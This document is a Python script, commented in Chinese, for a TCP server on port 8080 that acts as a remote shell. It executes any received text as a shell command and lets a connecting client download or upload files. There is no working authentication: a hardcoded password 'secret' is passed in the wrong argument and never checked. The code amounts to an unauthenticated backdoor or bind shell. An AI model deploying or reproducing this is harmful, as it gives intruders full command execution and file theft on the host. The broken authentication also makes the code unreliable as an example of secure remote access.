import os
import socket
import subprocess


# 接收文件
def receive_file(client_socket, file_name):
    try:
        with open(file_name, 'wb') as f:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                f.write(data)
        print(f'[+] Received file: {file_name}')
    except Exception as e:
        print(f'[-] Exception occurred: {e}')
        client_socket.sendall('[-] Exception occurred while receiving the file.'.encode())


def send_file(client_socket, file_name):
    try:
        # 打开文件
        with open(file_name, 'rb') as f:
            # 获取文件的大小
            file_size = os.path.getsize(file_name)
            # 向客户端发送文件大小，长度为4个字节，大端字节序
            client_socket.sendall(file_size.to_bytes(4, 'big'))
            # 循环读取文件内容，每次读取4096字节
            while True:
                data = f.read(4096)
                print(f'[DEBUG] sending data: {data}')
                # 如果读取到的内容为空，说明文件已经读取完毕
                if not data:
                    break
                # 向客户端发送数据
                client_socket.sendall(data)
        print(f'[+] Sent file: {file_name}')
    except Exception as e:
        # 如果发生异常，向客户端发送错误信息
        print(f'[-] Exception occurred: {e}')
        client_socket.sendall('[-] Exception occurred while sending the file.'.encode())


# 执行命令
def execute_command(client_socket, command, current_path):
    if command.startswith('get '):
        file_name = command[4:]
        file_path = os.path.join(current_path, file_name)
        if os.path.exists(file_path) and os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                file_data = file.read()
                client_socket.sendall(file_data)
        else:
            client_socket.sendall(b'File not found')
    else:
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True,
                                       universal_newlines=True)
            output, error = process.communicate()
            output = 'DONE\n' + output
            if output:
                client_socket.sendall(output.encode())
            if error:
                client_socket.sendall(error.encode())
        except Exception as e:
            client_socket.sendall(str(e).encode())


def handle_client(client_socket, current_path=None):
    client_socket.sendall('[+] Access granted.'.encode())
    while True:
        # client_request = client_socket.recv(4096).decode().strip()
        client_request = client_socket.recv(4096).decode()
        if not client_request:
            print('[-] Client has disconnected.')
            return
        print(f'[+] Received request: {client_request}')
        if client_request == 'exit':
            client_socket.close()
            break
        elif client_request.startswith('get'):
            try:
                file_name = client_request.split()[1]
                if os.path.isfile(file_name):
                    send_file(client_socket, file_name)
                else:
                    client_socket.sendall(f"[-] '{file_name}' does not exist on the server".encode())
            except Exception as e:
                print(f'[-] Exception occurred: {e}')
                client_socket.sendall('[-] Exception occurred while handling the request.'.encode())
        elif client_request.startswith('put'):
            file_name = client_request.split()[1]
            receive_file(client_socket, file_name)
        else:
            execute_command(client_socket, client_request, current_path)


def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 8080))
    server_socket.listen(5)
    print('[+] Listening for incoming connections...')
    password = 'secret'
    while True:
        client_socket, client_address = server_socket.accept()
        print(f'[+] Accepted connection from {client_address[0]}:{client_address[1]}')
        handle_client(client_socket, password)


if __name__ == '__main__':
    main()
